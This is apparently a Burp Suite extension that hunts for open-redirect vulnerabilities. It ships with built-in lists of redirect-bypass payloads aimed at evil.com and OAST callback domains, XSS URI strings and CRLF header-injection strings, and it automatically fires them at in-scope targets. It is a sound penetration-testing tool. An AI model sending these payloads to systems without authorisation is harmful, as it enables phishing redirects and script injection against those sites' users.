# -*- coding: utf-8 -*-

from burp import IBurpExtender, IHttpListener, ITab, IScanIssue, IContextMenuFactory
from java.io import PrintWriter
from javax.swing import (JPanel, JLabel, JTextField, JButton, BoxLayout, JScrollPane,
                         JTextArea, JCheckBox, SwingConstants)
from java.awt import BorderLayout, Dimension
from java.util import ArrayList
from javax.swing import JMenuItem
from java.net import URL
from java.awt import BorderLayout, Dimension, FlowLayout, GridLayout, Font, Color
from javax.swing import (
    JPanel, JLabel, JTextArea, JScrollPane, JCheckBox, JTextField,
    JButton, SwingConstants, Box
)
from javax.swing.border import TitledBorder, EmptyBorder
from javax.swing import JToggleButton
from urllib import quote, unquote
import threading
import time
import re
try:
    from urlparse import urlparse, parse_qs
except ImportError:
    from urllib.parse import urlparse, parse_qs

class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)
        self._callbacks.setExtensionName("Open Redirect Hunter Pro v3")

        self.last_request_time = 0
        self.lock = threading.Lock()
        self.max_threads = 5
        self.active_threads = []
        self.scanned_requests = set()
        
        # Initialize whitelisted domains
        self.whitelisted_domains = self.load_setting("whitelisted_domains", [])
        
        # Enhanced payloads with all bypass techniques
        self.payloads = self.load_setting("payloads", [
            # @ bypass patterns
            "@evil.com",
            "@evil.com/",
            "@evil.com%2f",
            "@evil.com%2F",
            "%40evil.com",
            "%40evil.com%2f",
            "%40evil.com%2F",
            "@evil.com\\",
            "@evil.com%5c",
            
            # Basic patterns
            "evil.com",
            "evil.com/",
            "evil.com%2f",
            "/evil.com",
            "//evil.com",
            "///evil.com",
            "////evil.com",
            "\\evil.com",
            "\\\\evil.com",
            "\\\evil.com",
            "/\\evil.com",
            
            # Protocol patterns
            "https://evil.com",
            "http://evil.com",
            "https:evil.com",
            "http:evil.com",
            "https:/evil.com",
            "http:/evil.com",
            
            # Encoded patterns
            "%2f%2fevil.com",
            "%5c%5cevil.com",
            "https%3A%2F%2Fevil.com",
            "http%3A%2F%2Fevil.com",
            
            # Authority confusion
            "https://google.com@evil.com",
            "https://google.com%40evil.com",
            "http://google.com@evil.com",
            "//google.com@evil.com",
            "https://evil.com@google.com",
            "@google.com@evil.com",
            
            # Fragment/query bypass
            "https://evil.com#",
            "https://evil.com?",
            "https://evil.com#@google.com",
            "https://evil.com?@google.com",
            
            # Path traversal
            "../evil.com",
            "..;/evil.com",
            "..%2fevil.com",
            "..%252fevil.com",
            
            # Null byte
            "https://evil.com%00",
            "https://evil.com%0d%0a",
            "evil.com%00.google.com",
            
            # XSS vectors
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:alert(1)",
            
            # CRLF injection
            "%0d%0aLocation:%20https://evil.com",
            "\r\nLocation: https://evil.com",
            
            # OAST domains
            "@oast.me",
            "@oast.pro",
            "@oast.live",
            "//oast.me",
            "https://oast.me",
            "@interact.sh",
            "//interact.sh"
        ])
        
        # Priority parameters to test
        self.priority_params = [
            "targetUrl", "targeturl", "target_url", "target", "url",
            "redirect_uri", "redirect_url", "redirect", "redir",
            "return_url", "return", "returnto", "return_to",
            "callback", "callback_url", "next", "next_page",
            "goto", "go", "dest", "destination", "continue",
            "forward", "forward_url", "jump", "jump_to", "out",
            "link", "linkurl", "domain", "uri", "path", "location",
            "ref", "referer", "referrer", "view", "load", "fetch",
            "service", "relay", "oauth_callback", "from", "to"
        ]
        
        self.keywords = self.load_setting("keywords", 
            ["url", "redirect", "next", "target", "return", "dest", "goto", "link", "continue", "returnto", "redir", "redirect_uri", "callback"])
        self.delay = float(self._callbacks.loadExtensionSetting("delay") or "2.0")
        self.extension_enabled = (self._callbacks.loadExtensionSetting("enabled") != "false")
        self.scan_post_enabled = (self._callbacks.loadExtensionSetting("scan_post") == "true")
        self.strict_mode = (self._callbacks.loadExtensionSetting("strict_mode") != "false")
        self.debug_mode = (self._callbacks.loadExtensionSetting("debug_mode") == "true")

        self.init_gui()
        callbacks.addSuiteTab(self)
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)
        self.update_status("Extension loaded and ready.")

    def createMenuItems(self, invocation):
        menu = ArrayList()
        request_responses = invocation.getSelectedMessages()
        if not request_responses:
            return None

        menu_item = JMenuItem("Scan with Open Redirect Hunter Pro v3", 
                            actionPerformed=lambda e: self.manual_scan(request_responses[0]))
        menu.add(menu_item)
        return menu

    def manual_scan(self, messageInfo):
        try:
            request_info = self._helpers.analyzeRequest(messageInfo)
            url = request_info.getUrl()
            method = request_info.getMethod()
            param_source = "query" if method == "GET" else "body"
            
            self._stdout.println("[*] Starting manual scan for: %s" % url.toString())
            self.start_scan_thread(url, messageInfo, param_source, is_manual=True)
            self.update_status("Manual scan started for: %s" % url.toString())
        except Exception as e:
            self._stderr.println("[!] Error in manual scan: %s" % str(e))
            import traceback
            self._stderr.println(traceback.format_exc())
            self.update_status("Error during manual scan.")

    def load_setting(self, key, default):
        saved = self._callbacks.loadExtensionSetting(key)
        if saved:
            if isinstance(default, list):
                return [item.strip() for item in saved.strip().split('\n') if item.strip()]
            return saved
        return default

    def save_settings(self, event):
        try:
            self.payloads = [p.strip() for p in self.payload_area.getText().splitlines() if p.strip()]
            self.keywords = [k.strip().lower() for k in self.keyword_field.getText().split(',') if k.strip()]
            self.whitelisted_domains = [d.strip().lower() for d in self.whitelist_area.getText().splitlines() if d.strip()]
            self.delay = float(self.rate_field.getText().strip())
            self.extension_enabled = self.toggle_checkbox.isSelected()
            self.scan_post_enabled = self.scan_post_checkbox.isSelected()
            self.strict_mode = self.strict_mode_checkbox.isSelected()
            self.debug_mode = self.debug_checkbox.isSelected()

            self._callbacks.saveExtensionSetting("payloads", "\n".join(self.payloads))
            self._callbacks.saveExtensionSetting("keywords", ",".join(self.keywords))
            self._callbacks.saveExtensionSetting("whitelisted_domains", "\n".join(self.whitelisted_domains))
            self._callbacks.saveExtensionSetting("delay", str(self.delay))
            self._callbacks.saveExtensionSetting("enabled", "true" if self.extension_enabled else "false")
            self._callbacks.saveExtensionSetting("scan_post", "true" if self.scan_post_enabled else "false")
            self._callbacks.saveExtensionSetting("strict_mode", "true" if self.strict_mode else "false")
            self._callbacks.saveExtensionSetting("debug_mode", "true" if self.debug_mode else "false")

            self.update_status("Settings saved successfully.")
        except Exception as e:
            self._stderr.println("[!] Error updating settings: %s" % str(e))
            self.update_status("Error saving settings.")

    def init_gui(self):
        self.panel = JPanel(BorderLayout(10, 10))
        self.panel.setBorder(EmptyBorder(10, 10, 10, 10))

        main_panel = JPanel()
        main_panel.setLayout(BoxLayout(main_panel, BoxLayout.Y_AXIS))

        # General Options
        general_panel = JPanel(GridLayout(0, 1, 5, 5))
        general_panel.setBorder(TitledBorder("General Settings"))

        self.toggle_checkbox = JCheckBox("Enable Extension", self.extension_enabled)
        general_panel.add(self.toggle_checkbox)

        self.scan_post_checkbox = JCheckBox("Scan POST requests", self.scan_post_enabled)
        general_panel.add(self.scan_post_checkbox)

        self.scan_all_checkbox = JCheckBox("Scan all parameters (ignore keyword filtering)", False)
        general_panel.add(self.scan_all_checkbox)
        
        self.strict_mode_checkbox = JCheckBox("Strict Mode (reduces false positives)", self.strict_mode)
        general_panel.add(self.strict_mode_checkbox)
        
        self.debug_checkbox = JCheckBox("Debug Mode (verbose logging)", self.debug_mode)
        general_panel.add(self.debug_checkbox)

        main_panel.add(general_panel)

        # Payloads Section
        payload_panel = JPanel(BorderLayout())
        payload_panel.setBorder(TitledBorder("Redirect Payloads"))

        self.payload_area = JTextArea("\n".join(self.payloads), 8, 50)
        self.payload_area.setLineWrap(True)
        self.payload_area.setWrapStyleWord(True)
        scroll_payload = JScrollPane(self.payload_area)
        scroll_payload.setPreferredSize(Dimension(500, 120))
        payload_panel.add(scroll_payload, BorderLayout.CENTER)

        main_panel.add(Box.createVerticalStrut(10))
        main_panel.add(payload_panel)
        
        # Whitelist Section
        whitelist_panel = JPanel(BorderLayout())
        whitelist_panel.setBorder(TitledBorder("Whitelisted Domains (one per line)"))
        
        self.whitelist_area = JTextArea("\n".join(self.whitelisted_domains), 4, 50)
        self.whitelist_area.setLineWrap(True)
        self.whitelist_area.setWrapStyleWord(True)
        scroll_whitelist = JScrollPane(self.whitelist_area)
        scroll_whitelist.setPreferredSize(Dimension(500, 60))
        whitelist_panel.add(scroll_whitelist, BorderLayout.CENTER)
        
        main_panel.add(Box.createVerticalStrut(10))
        main_panel.add(whitelist_panel)

        # Keywords and Rate Limit
        keyword_panel = JPanel(GridLayout(0, 2, 5, 5))
        keyword_panel.setBorder(TitledBorder("Filtering and Timing"))

        keyword_panel.add(JLabel("Parameter keywords to watch:"))
        self.keyword_field = JTextField(", ".join(self.keywords), 50)
        keyword_panel.add(self.keyword_field)

        keyword_panel.add(JLabel("Rate Limit (seconds between scans):"))
        self.rate_field = JTextField(str(self.delay), 5)
        keyword_panel.add(self.rate_field)

        main_panel.add(Box.createVerticalStrut(10))
        main_panel.add(keyword_panel)

        # Save Button
        button_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        self.save_button = JButton("Save Settings", actionPerformed=self.save_settings)
        button_panel.add(self.save_button)
        main_panel.add(Box.createVerticalStrut(10))
        main_panel.add(button_panel)

        # Status Label
        self.status_label = JLabel("Status: Ready", SwingConstants.LEFT)
        self.status_label.setBorder(EmptyBorder(5, 5, 5, 5))
        self.status_label.setFont(self.status_label.getFont().deriveFont(Font.BOLD))

        self.panel.add(main_panel, BorderLayout.CENTER)
        self.panel.add(self.status_label, BorderLayout.SOUTH)

    def getTabCaption(self):
        return "Open Redirect Hunter Pro v3"

    def getUiComponent(self):
        return self.panel

    def update_status(self, message):
        self.status_label.setText("Status: " + message)
        self._stdout.println("[*] " + message)

    def is_valid_open_redirect(self, location_header, payload, original_host):
        """
        Enhanced validation to detect advanced open redirect bypasses.
        Returns (is_vulnerable, confidence, reason)
        """
        if not location_header:
            return False, None, None
            
        location_lower = location_header.lower()
        payload_lower = payload.lower()
        
        if self.debug_mode:
            self._stdout.println("[DEBUG] Checking location: %s" % location_header)
            self._stdout.println("[DEBUG] Against payload: %s" % payload)
        
        # Decode both for comparison
        try:
            decoded_location = unquote(location_header)
            decoded_payload = unquote(payload)
        except:
            decoded_location = location_header
            decoded_payload = payload
        
        # Extract malicious domains
        evil_domains = ["evil.com", "oast.me", "oast.pro", "oast.live", 
                       "oast.online", "oast.fun", "oast.site", "burpcollaborator.net",
                       "interact.sh", "oastify.com", "canarytokens.com"]
        
        # Special URI schemes
        if location_lower.startswith(("javascript:", "data:", "vbscript:", "file:", "jar:")):
            return True, "High", "XSS/LFI via %s URI scheme" % location_lower.split(':')[0]
        
        # CRITICAL: Check if location exactly matches our payload or is empty redirect
        if location_header == payload or decoded_location == decoded_payload:
            # Check if it contains any evil domain or bypass pattern
            for evil_domain in evil_domains:
                if evil_domain in decoded_location.lower():
                    return True, "High", "Direct payload reflection with evil domain"
            # Check for @ bypass patterns even without evil domain
            if "@" in decoded_location and not decoded_location.startswith("mailto:"):
                return True, "High", "Direct @ bypass pattern reflected"
                
        # Empty value that becomes our payload
        if location_header in ["", "/"]:
            if "@" in payload_lower or any(evil in payload_lower for evil in evil_domains):
                return True, "High", "Empty redirect populated with payload"
        
        # Check various bypass patterns
        for evil_domain in evil_domains:
            # @ prefix patterns (like @evil.com)
            patterns_to_check = [
                "@" + evil_domain,
                "%40" + evil_domain,
                "\\@" + evil_domain,
                "@" + evil_domain + "/",
                "@" + evil_domain + "\\",
                "@" + evil_domain + "%2f",
                "@" + evil_domain + "%5c",
            ]
            
            for pattern in patterns_to_check:
                if pattern in location_lower or pattern in decoded_location.lower():
                    return True, "High", "@ bypass to evil domain: %s" % pattern
            
            # Check if location starts with evil domain (various formats)
            if location_lower.startswith((evil_domain, "//" + evil_domain, 
                                         "///" + evil_domain, "\\\\" + evil_domain)):
                return True, "High", "Direct redirect to: %s" % evil_domain
                
            # Authority confusion patterns
            if "@" + evil_domain in location_lower:
                # Ensure it's not just in a query parameter
                if "?" in location_header:
                    base_part = location_header.split("?")[0]
                    if "@" + evil_domain in base_part.lower():
                        return True, "High", "@ authority bypass in URL path"
                else:
                    return True, "High", "@ authority bypass detected"
                    
            # Backslash patterns
            if "\\" in location_header and evil_domain in location_lower:
                return True, "Medium", "Backslash bypass with evil domain"
                
            # Multiple slashes
            if ("///" in location_header or "////" in location_header) and evil_domain in location_lower:
                return True, "Medium", "Multiple slash bypass"
                
            # Encoded patterns
            encoded_patterns = [
                "%2f%2f" + evil_domain,
                evil_domain + "%2f%2e%2e",
                evil_domain + "%252f",
                "%5c%5c" + evil_domain,
            ]
            
            for pattern in encoded_patterns:
                if pattern in location_lower:
                    return True, "Medium", "Encoded bypass pattern: %s" % pattern
                    
            # Check for partial domain injection
            if evil_domain in location_lower:
                # Parse to check if it's the actual host
                try:
                    parsed = urlparse(location_header)
                    if parsed.hostname and evil_domain in parsed.hostname.lower():
                        return True, "High", "Evil domain in hostname: %s" % parsed.hostname
                except:
                    pass
                    
        # Check for open redirect to any external domain (not just evil domains)
        if self.strict_mode == False:
            try:
                parsed = urlparse(location_header)
                if parsed.hostname and parsed.hostname.lower() != original_host.lower():
                    # Check if it's not a relative redirect
                    if not location_header.startswith("/") or "//" in location_header[:3]:
                        # Potential open redirect to external site
                        if "@" in location_header:
                            return True, "Medium", "Potential @ bypass to external domain"
                        if location_header.startswith("//"):
                            return True, "Medium", "Protocol-relative redirect to external domain"
            except:
                pass
                
        return False, None, None

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not self.extension_enabled or not messageIsRequest:
            return

        try:
            request_info = self._helpers.analyzeRequest(messageInfo)
            url = request_info.getUrl()
            method = request_info.getMethod()

            if method == "GET":
                query = url.getQuery()
                param_source = "query"
            elif method == "POST" and self.scan_post_enabled:
                request_bytes = messageInfo.getRequest()
                body_offset = request_info.getBodyOffset()
                body = request_bytes[body_offset:].tostring()
                query = body
                param_source = "body"
            else:
                return

            if not self._callbacks.isInScope(url):
                return

            if not query:
                return

            scanned_any = False
            param_pairs = query.split('&')
            for param in param_pairs:
                key, _, val = param.partition('=')
                key = key.strip()
                
                # Check if we should scan this parameter
                should_scan = self.scan_all_checkbox.isSelected() or \
                            any(word in key.lower() for word in self.keywords)
                            
                if should_scan:
                    key_id = (url.getPath(), key.lower())
                    if key_id not in self.scanned_requests:
                        self.scanned_requests.add(key_id)
                        if not scanned_any:
                            self.start_scan_thread(url, messageInfo, param_source)
                            scanned_any = True
                            
        except Exception as e:
            self._stderr.println("[!] Error in processing request: %s" % str(e))

    def start_scan_thread(self, url, messageInfo, param_source, is_manual=False):
        with self.lock:
            # For manual scans, don't check thread limit
            if not is_manual and len(self.active_threads) >= self.max_threads:
                return

            def runner():
                try:
                    self.scan_with_rate_limit(url, messageInfo, param_source)
                except Exception as e:
                    self._stderr.println("[!] Thread error: %s" % str(e))
                    import traceback
                    self._stderr.println(traceback.format_exc())
                    self.update_status("Error during scan: %s" % str(e))
                finally:
                    with self.lock:
                        if thread in self.active_threads:
                            self.active_threads.remove(thread)

            thread = threading.Thread(target=runner)
            thread.daemon = True
            self.active_threads.append(thread)
            thread.start()

    def scan_with_rate_limit(self, url, messageInfo, param_source):
        with self.lock:
            now = time.time()
            wait = self.delay - (now - self.last_request_time)
            if wait > 0:
                time.sleep(wait)
            self.last_request_time = time.time()
        
        # Run scan outside the lock to avoid blocking
        self.scan_for_redirects(url, messageInfo, param_source)

    def scan_for_redirects(self, base_url, messageInfo, param_source):
        try:
            parsed = self._helpers.analyzeRequest(messageInfo)
            headers = list(parsed.getHeaders())
            orig_url = base_url.toString()
            original_host = base_url.getHost()

            if self.debug_mode:
                self._stdout.println("[DEBUG] Starting scan for URL: %s" % orig_url)
                self._stdout.println("[DEBUG] Parameter source: %s" % param_source)

            if param_source == "query":
                query = base_url.getQuery()
            else:
                request_bytes = messageInfo.getRequest()
                body_offset = parsed.getBodyOffset()
                body = request_bytes[body_offset:]
                query = body.decode('utf-8', errors='ignore')

            # Update status with full URL
            self.update_status("Scanning: %s" % orig_url)

            # Extract parameters - INCLUDING EMPTY ONES
            params = {}
            empty_params = []
            
            if query:
                for param in query.split('&'):
                    if '=' in param:
                        key, val = param.split('=', 1)
                        params[key] = val
                        # Track if parameter is empty or has suspicious empty-like values
                        if val in ['', '/', '//', 'http://', 'https://', 'http:', 'https:', '#', '?']:
                            empty_params.append(key)
                            self._stdout.println("[*] Found empty/suspicious parameter: %s=%s" % (key, val))
                    else:
                        # Parameter without value
                        params[param] = ''
                        empty_params.append(param)

            if self.debug_mode:
                self._stdout.println("[DEBUG] Found parameters: %s" % params.keys())
                if empty_params:
                    self._stdout.println("[DEBUG] Empty/suspicious parameters: %s" % empty_params)

            # Track if vulnerability was found
            vulnerability_found = False
            tested_params = set()
            
            # First test empty/suspicious parameters with ALL payloads
            for param_key in empty_params:
                if vulnerability_found:
                    break
                if param_key in tested_params:
                    continue
                    
                tested_params.add(param_key)
                self._stdout.println("[!] Testing EMPTY parameter '%s' with ALL payloads" % param_key)
                self.update_status("Testing empty param '%s' with %d payloads on %s" % (param_key, len(self.payloads), base_url.getHost()))
                
                payload_count = 0
                for test_payload in self.payloads:
                    if vulnerability_found:
                        break
                        
                    payload_count += 1
                    if payload_count % 10 == 0:
                        self.update_status("Testing payload %d/%d for '%s'" % (payload_count, len(self.payloads), param_key))
                        
                    new_params = params.copy()
                    new_params[param_key] = test_payload
                    
                    # Build request - preserve encoding for already encoded payloads
                    param_list = []
                    for k, v in new_params.items():
                        if k == param_key:
                            # For the parameter we're testing, use the payload as-is if it contains encoding
                            if '%' in test_payload or '\\' in test_payload:
                                param_list.append("%s=%s" % (k, v))
                            else:
                                param_list.append("%s=%s" % (k, quote(str(v), safe='')))
                        else:
                            # For other params, preserve original values
                            if v:
                                param_list.append("%s=%s" % (k, v))
                            else:
                                param_list.append(k + "=")
                    
                    new_query = "&".join(param_list)
                    url_base = orig_url.split('?')[0]
                    new_url_str = url_base + "?" + new_query
                    
                    if self.debug_mode and payload_count <= 5:
                        self._stdout.println("[DEBUG] Testing with payload %d: %s" % (payload_count, test_payload))
                    
                    try:
                        request = self._helpers.buildHttpRequest(URL(new_url_str))
                        http_service = messageInfo.getHttpService()
                        response = self._callbacks.makeHttpRequest(http_service, request)
                        
                        if response and response.getResponse():
                            analyzed_resp = self._helpers.analyzeResponse(response.getResponse())
                            
                            # Check for Location header
                            for header in analyzed_resp.getHeaders():
                                if header.lower().startswith("location:"):
                                    location = header.split(":", 1)[1].strip()
                                    
                                    if self.debug_mode and payload_count <= 5:
                                        self._stdout.println("[DEBUG] Got location: %s" % location)
                                    
                                    is_vuln, confidence, reason = self.is_valid_open_redirect(
                                        location, test_payload, original_host
                                    )
                                    
                                    if is_vuln:
                                        self._stdout.println("[+] OPEN REDIRECT FOUND!")
                                        self._stdout.println("    Parameter: %s" % param_key)
                                        self._stdout.println("    Payload: %s" % test_payload)
                                        self._stdout.println("    Location: %s" % location)
                                        self._stdout.println("    Confidence: %s" % confidence)
                                        self.report_redirect(http_service, new_url_str, response, 
                                                          test_payload, location, confidence, 
                                                          "Empty parameter exploit: " + param_key + " - " + reason)
                                        vulnerability_found = True
                                        self.update_status("VULNERABLE: Open redirect in '%s' on %s" % (param_key, base_url.getHost()))
                                        break
                    except Exception as e:
                        if self.debug_mode:
                            self._stderr.println("[DEBUG] Error testing payload %d: %s" % (payload_count, str(e)))
                
                if not vulnerability_found:
                    self._stdout.println("[-] Tested %d payloads for '%s' - no vulnerability found" % (payload_count, param_key))
            
            # Test priority parameters if no vuln found yet
            if not vulnerability_found:
                for key in params:
                    if vulnerability_found:
                        break
                    if key in tested_params:
                        continue
                        
                    # Check if it's a priority parameter
                    if key.lower() in [p.lower() for p in self.priority_params]:
                        tested_params.add(key)
                        self._stdout.println("[*] Testing priority parameter '%s' with ALL payloads" % key)
                        self.update_status("Testing priority param '%s' with %d payloads" % (key, len(self.payloads)))
                        
                        payload_count = 0
                        for test_payload in self.payloads:
                            if vulnerability_found:
                                break
                                
                            payload_count += 1
                            if payload_count % 10 == 0:
                                self.update_status("Testing payload %d/%d for '%s'" % (payload_count, len(self.payloads), key))
                                
                            new_params = params.copy()
                            new_params[key] = test_payload
                            
                            # Build query with proper encoding
                            param_list = []
                            for k, v in new_params.items():
                                if k == key:
                                    if '%' in test_payload or '\\' in test_payload:
                                        param_list.append("%s=%s" % (k, v))
                                    else:
                                        param_list.append("%s=%s" % (k, quote(str(v), safe='')))
                                else:
                                    if v:
                                        param_list.append("%s=%s" % (k, v))
                                    else:
                                        param_list.append(k + "=")
                            
                            new_query = "&".join(param_list)
                            url_base = orig_url.split('?')[0]
                            new_url_str = url_base + "?" + new_query
                            
                            try:
                                request = self._helpers.buildHttpRequest(URL(new_url_str))
                                http_service = messageInfo.getHttpService()
                                response = self._callbacks.makeHttpRequest(http_service, request)
                                
                                if response and response.getResponse():
                                    analyzed_resp = self._helpers.analyzeResponse(response.getResponse())
                                    
                                    for header in analyzed_resp.getHeaders():
                                        if header.lower().startswith("location:"):
                                            location = header.split(":", 1)[1].strip()
                                            
                                            is_vuln, confidence, reason = self.is_valid_open_redirect(
                                                location, test_payload, original_host
                                            )
                                            
                                            if is_vuln:
                                                self._stdout.println("[+] OPEN REDIRECT FOUND!")
                                                self._stdout.println("    Parameter: %s" % key)
                                                self._stdout.println("    Payload: %s" % test_payload)
                                                self._stdout.println("    Location: %s" % location)
                                                self.report_redirect(http_service, new_url_str, response, 
                                                                  test_payload, location, confidence, reason)
                                                vulnerability_found = True
                                                self.update_status("VULNERABLE: Open redirect in '%s' on %s" % (key, base_url.getHost()))
                                                break
                            except Exception as e:
                                if self.debug_mode:
                                    self._stderr.println("[DEBUG] Error: %s" % str(e))
                        
                        if not vulnerability_found:
                            self._stdout.println("[-] Tested %d payloads for '%s' - no vulnerability found" % (payload_count, key))
            
            if vulnerability_found:
                self.update_status("VULNERABLE: Open redirect found on %s" % base_url.getHost())
                self._stdout.println("[!] Stopped scanning - vulnerability found")
            else:
                self.update_status("Scan complete for %s: no open redirects found" % base_url.getHost())

        except Exception as e:
            self._stderr.println("[!] Scan error: %s" % str(e))
            import traceback
            self._stderr.println(traceback.format_exc())
            self.update_status("Error during scan: %s" % str(e))

    def report_redirect(self, http_service, url_str, response_info, payload, location, confidence, reason):
        severity = "High" if confidence == "High" else "Medium"
        
        detail = """
        <p>The application appears to be vulnerable to open redirect attacks.</p>
        <p><b>Payload used:</b> %s</p>
        <p><b>Redirect location:</b> %s</p>
        <p><b>Confidence:</b> %s</p>
        <p><b>Detection reason:</b> %s</p>
        <p>An attacker could use this to redirect users to malicious sites while appearing to originate from the legitimate application.</p>
        """ % (payload, location, confidence, reason)
        
        issue = CustomScanIssue(
            http_service,
            URL(url_str),
            [response_info],
            "Open Redirect Vulnerability",
            detail,
            severity
        )
        self._callbacks.addScanIssue(issue)

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0x08000000

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        return "Open redirect vulnerabilities occur when an application accepts untrusted input that specifies a URL to which users will be redirected."

    def getRemediationBackground(self):
        return "Validate and whitelist allowed redirect destinations. Never redirect to URLs provided directly by users without validation."

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return "Implement a whitelist of allowed redirect destinations and validate all redirect URLs against this list."

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
